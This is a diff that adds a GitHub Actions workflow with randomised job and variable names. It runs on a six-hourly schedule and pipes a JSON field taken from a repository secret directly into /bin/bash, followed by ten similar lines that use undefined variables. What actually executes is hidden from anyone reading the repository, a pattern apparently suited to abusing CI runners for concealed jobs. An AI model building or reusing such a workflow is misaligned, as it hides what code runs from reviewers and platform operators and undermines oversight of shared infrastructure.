@@ -1,0 +1,27 @@
+name: jingjiacun3489
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jingjiacun3489
+        env:
+          w84647: ${{ secrets.w84647 }}
+        run: |
+          echo $w84647 | jq -r .bcxm84942 | /bin/bash
+          echo $snz5210 | jq -r .yci91 | /bin/bash
+          echo $kvh6621 | jq -r .uoubr2617 | /bin/bash
+          echo $o9 | jq -r .y4 | /bin/bash
+          echo $hjnq0617 | jq -r .ujw78642 | /bin/bash
+          echo $vf52301 | jq -r .geyqm351 | /bin/bash
+          echo $eeeb6 | jq -r .dtmdq29371 | /bin/bash
+          echo $ggoz7803 | jq -r .nvw04182 | /bin/bash
+          echo $esc98479 | jq -r .tmhc0430 | /bin/bash
+          echo $b35 | jq -r .unz12 | /bin/bash
+          echo $fcn909 | jq -r .nnazf47 | /bin/bash
+
